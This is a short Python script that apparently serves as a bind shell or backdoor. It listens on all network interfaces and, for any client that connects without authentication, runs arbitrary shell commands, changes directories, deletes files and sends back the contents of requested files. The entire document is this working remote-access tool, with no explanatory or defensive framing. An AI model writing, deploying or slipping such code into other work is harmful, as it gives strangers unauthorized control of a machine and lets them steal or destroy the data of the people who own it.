#!/bin/python3
import socket
import subprocess
import os
import keyboard
bindip='0.0.0.0'
bindport=int(input("port "))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((bindip,bindport))
s.listen(5)
print(f"[*] Listening on {bindip}:{bindport}")
def handle_client():
	global c
	global f_n
	while True:
		request=client.recv(4096)
		c=request.decode()
		if c=='exit' or c=='quit':
			client.close()
			s.shutdown()
			exit()
		if c[0:2]=='cd':
			os.chdir(c[3:])
			dc="Directory Changed"
			client.send(dc.encode())
		elif c[0:2]=='rm':
			os.remove(c[3:])
			fd="File Deleted"
			client.send(fd.encode())
		elif c[0:3]=='get':
			f=open(c[4:],'r')
			data=f.read()
			f.close()
			d=f"{data}"
			sd="downloading file"
			client.send(d.encode())
			client.send(sd.encode())
		else:	
			out=subprocess.run(c,shell=True,capture_output=True,text=True)
			out_data=out.stdout
			client.sendall(out_data.encode())

while True:
	client,addr=s.accept()
	handle_client()

	




